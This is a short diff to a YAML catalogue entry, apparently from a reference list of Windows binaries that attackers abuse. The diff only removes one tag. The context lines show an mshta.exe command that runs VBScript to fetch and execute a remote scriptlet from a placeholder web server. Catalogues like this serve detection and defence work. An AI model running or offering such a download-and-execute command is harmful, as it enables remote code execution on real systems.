@@ -14,7 +14,6 @@ Commands:
     Tags:
       - Execute: WSH
       - Execute: Remote
-      - Input: Custom Format
   - Command: mshta.exe vbscript:Close(Execute("GetObject(""script:https://webserver/payload.sct"")"))
     Description: Executes VBScript supplied as a command line argument.
     Usecase: Execute code
